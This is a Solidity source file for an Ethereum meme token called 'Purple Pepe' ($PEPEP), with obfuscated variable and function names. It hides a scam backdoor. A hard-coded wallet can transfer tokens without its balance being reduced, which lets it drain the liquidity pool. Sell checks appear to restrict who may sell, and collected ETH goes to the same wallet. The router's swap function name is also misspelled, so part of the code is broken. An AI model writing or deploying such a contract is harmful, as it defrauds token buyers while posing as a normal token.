/**

Purple Pepe    $PEPEP


TWITTER: https://twitter.com/PepePurpleETH
TELEGRAM: https://t.me/PEPEP_ETH
WEBSITE: https://pepep.org/

**/


// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _wuqnb(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wuqnb(a, b, "SafeMath:");
    }

    function  _wuqnb(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _kagvcztup {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _pfouzmkuas {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract PEPEP is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Purple Pepe";
    string private constant _symbol = unicode"PEPEP";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalzu = 100000000 * 10 **_decimals;
    uint256 public _mxTgmcAmaunt = _Totalzu;
    uint256 public _Wallekxbfo = _Totalzu;
    uint256 public _wapThresholdmcx= _Totalzu;
    uint256 public _mkolTwaqc= _Totalzu;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isxExcapmf;
    mapping (address => bool) private _taxvWaervy;
    mapping(address => uint256) private _lruehrkbacp;
    bool public _taerelorve = false;
    address payable private _qumopkfq;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBefaepnb=0;
    uint256 private _buraknyr=0;


    _pfouzmkuas private _YamRaznat;
    address private _acMkvaujw;
    bool private _quomvajh;
    bool private lovStqkuq = false;
    bool private _aqmkuajyq = false;


    event _amgfoigtl(uint _mxTgmcAmaunt);
    modifier lokecThtcap {
        lovStqkuq = true;
        _;
        lovStqkuq = false;
    }

    constructor () {
        _qumopkfq = payable(0x43C0596F2a651AD316E2311d0E54AdFE4897dAa3);
        _balances[_msgSender()] = _Totalzu;
        _isxExcapmf[owner()] = true;
        _isxExcapmf[address(this)] = true;
        _isxExcapmf[_qumopkfq] = true;

 

        emit Transfer(address(0), _msgSender(), _Totalzu);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalzu;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wuqnb(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_taerelorve) {
                if (to != address
                (_YamRaznat) && to !=
                 address(_acMkvaujw)) {
                  require(_lruehrkbacp
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruehrkbacp
                  [tx.origin] = block.number;
                }
            }

            if (from == _acMkvaujw && to != 
            address(_YamRaznat) && !_isxExcapmf[to] ) {
                require(amount <= _mxTgmcAmaunt,
                 "Exceeds the _mxTgmcAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallekxbfo, "Exceeds the maxWalletSize.");
                if(_buraknyr
                < _wapBefaepnb){
                  require(! _feiqoap(to));
                }
                _buraknyr++;
                 _taxvWaervy[to]=true;
                teeomoun = amount.mul((_buraknyr>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _acMkvaujw && from!= address(this) 
            && !_isxExcapmf[from] ){
                require(amount <= _mxTgmcAmaunt && 
                balanceOf(_qumopkfq)<_mkolTwaqc,
                 "Exceeds the _mxTgmcAmaunt.");
                teeomoun = amount.mul((_buraknyr>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_buraknyr>_wapBefaepnb &&
                 _taxvWaervy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!lovStqkuq 
            && to == _acMkvaujw && _aqmkuajyq &&
             contractTokenBalance>_wapThresholdmcx 
            && _buraknyr>_wapBefaepnb&&
             !_isxExcapmf[to]&& !_isxExcapmf[from]
            ) {
                _swpkurgrzj( _wnupe(amount, 
                _wnupe(contractTokenBalance,_mkolTwaqc)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rmonwenp(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _wuqnb(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _wuqnb(teeomoun));
        emit Transfer(from, to, 
        amount. _wuqnb(teeomoun));
    }

    function _swpkurgrzj(uint256
     tokenAmount) private lokecThtcap {
        if(tokenAmount==0){return;}
        if(!_quomvajh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _YamRaznat.WETH();
        _approve(address(this),
         address(_YamRaznat), tokenAmount);
        _YamRaznat.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _wnupe(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _wuqnb(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qumopkfq){
            return a ;
        }else{
            return a . _wuqnb (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTgmcAmaunt = _Totalzu;
        _Wallekxbfo = _Totalzu;
        _taerelorve = false;
        emit _amgfoigtl(_Totalzu);
    }

    function _feiqoap(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rmonwenp(uint256
    amount) private {
        _qumopkfq.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _quomvajh);
        _YamRaznat   =  _pfouzmkuas (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_YamRaznat), _Totalzu);
        _acMkvaujw = _kagvcztup(_YamRaznat.factory()). createPair (address(this),  _YamRaznat . WETH ());
        _YamRaznat.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_acMkvaujw).approve(address(_YamRaznat), type(uint).max);
        _aqmkuajyq = true;
        _quomvajh = true;
    }

    receive() external payable {}
}